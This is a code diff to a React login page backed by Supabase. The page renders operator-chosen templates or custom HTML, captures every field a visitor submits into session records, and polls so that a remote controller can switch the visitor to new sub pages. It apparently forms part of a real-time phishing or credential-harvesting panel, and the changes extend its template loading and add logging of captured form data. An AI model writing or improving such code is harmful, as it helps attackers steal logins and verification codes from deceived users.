@@ -1,4 +1,3 @@
-
 import React, { useEffect, useState } from 'react';
 import { useParams } from 'react-router-dom';
 import { Card, CardContent, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
@@ -16,6 +15,7 @@ const LoginPage = () => {
   const [formData, setFormData] = useState<Record<string, string>>({});
   const [session, setSession] = useState<any>(null);
   const [subPage, setSubPage] = useState<any>(null);
+  const [mainPage, setMainPage] = useState<any>(null);
   const [submitted, setSubmitted] = useState(false);
   const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
@@ -31,6 +31,9 @@ const LoginPage = () => {
       }
 
       try {
+        console.log('Fetching session:', sessionId);
+        
+        // Get session data
         const { data: sessionData, error: sessionError } = await supabase
           .from('sessions')
           .select('*')
@@ -39,23 +42,48 @@ const LoginPage = () => {
           .single();
 
         if (sessionError || !sessionData) {
+          console.error('Session error:', sessionError);
           setError('Session not found or inactive');
           setPageLoading(false);
           return;
         }
 
+        console.log('Session data:', sessionData);
         setSession(sessionData);
 
-        // Get the current subpage details
-        const mainPage = getMainPageById(sessionData.main_page_id);
-        const currentSubPage = getSubPageById(sessionData.main_page_id, sessionData.current_sub_page_id);
-        
-        if (currentSubPage) {
-          setSubPage(currentSubPage);
-        } else {
+        // Get main page data
+        const { data: mainPageData, error: mainPageError } = await supabase
+          .from('main_pages')
+          .select('*')
+          .eq('id', sessionData.main_page_id)
+          .single();
+
+        if (mainPageError || !mainPageData) {
+          console.error('Main page error:', mainPageError);
           setError('Page template not found');
+          setPageLoading(false);
+          return;
         }
-        
+
+        console.log('Main page data:', mainPageData);
+        setMainPage(mainPageData);
+
+        // Get sub page data
+        const { data: subPageData, error: subPageError } = await supabase
+          .from('sub_pages')
+          .select('*')
+          .eq('id', sessionData.current_sub_page_id)
+          .single();
+
+        if (subPageError || !subPageData) {
+          console.error('Sub page error:', subPageError);
+          setError('Sub page template not found');
+          setPageLoading(false);
+          return;
+        }
+
+        console.log('Sub page data:', subPageData);
+        setSubPage(subPageData);
         setPageLoading(false);
       } catch (err) {
         console.error('Error fetching session:', err);
@@ -65,7 +93,7 @@ const LoginPage = () => {
     };
 
     fetchSession();
-  }, [sessionId, getMainPageById, getSubPageById]);
+  }, [sessionId]);
 
   // Poll for session updates
   useEffect(() => {
@@ -82,13 +110,20 @@ const LoginPage = () => {
 
         if (!error && updatedSession) {
           if (updatedSession.current_sub_page_id !== session.current_sub_page_id) {
+            console.log('Session updated, new sub page:', updatedSession.current_sub_page_id);
             setSession(updatedSession);
-            const mainPage = getMainPageById(updatedSession.main_page_id);
-            const newSubPage = getSubPageById(updatedSession.main_page_id, updatedSession.current_sub_page_id);
             
-            if (newSubPage) {
-              setSubPage(newSubPage);
+            // Fetch new sub page data
+            const { data: newSubPageData, error: subPageError } = await supabase
+              .from('sub_pages')
+              .select('*')
+              .eq('id', updatedSession.current_sub_page_id)
+              .single();
+
+            if (!subPageError && newSubPageData) {
+              setSubPage(newSubPageData);
               setFormData({});
+              setSubmitted(false);
               setIsLoading(false);
             }
           }
@@ -99,7 +134,7 @@ const LoginPage = () => {
     }, 2000);
 
     return () => clearInterval(intervalId);
-  }, [sessionId, session, getMainPageById, getSubPageById]);
+  }, [sessionId, session]);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setFormData({
@@ -121,6 +156,8 @@ const LoginPage = () => {
       
       const mockLocation = 'New York, USA';
       const mockIp = '192.168.1.' + Math.floor(Math.random() * 255);
+      
+      console.log('Submitting form data:', formData);
       
       addSessionData(sessionId, {
         timestamp: new Date().toISOString(),
@@ -153,6 +190,7 @@ const LoginPage = () => {
       formDataObj[key] = value.toString();
     }
     
+    console.log('Custom form data:', formDataObj);
     setFormData(formDataObj);
     handleSubmit(event as unknown as React.FormEvent);
   };
@@ -273,6 +311,7 @@ const LoginPage = () => {
 
   // If subpage has custom HTML, render it
   if (subPage.html && subPage.html.trim()) {
+    console.log('Rendering custom HTML:', subPage.html);
     return (
       <div className="min-h-screen flex items-center justify-center p-4">
         <div 
@@ -286,6 +325,9 @@ const LoginPage = () => {
 
   // Dynamic form based on current subpage fields or predefined forms
   const renderDynamicForm = () => {
+    console.log('Rendering dynamic form for sub page:', subPage);
+    console.log('Sub page fields:', subPage.fields);
+    
     // Check if subpage has defined fields
     if (subPage.fields && subPage.fields.length > 0) {
       return (
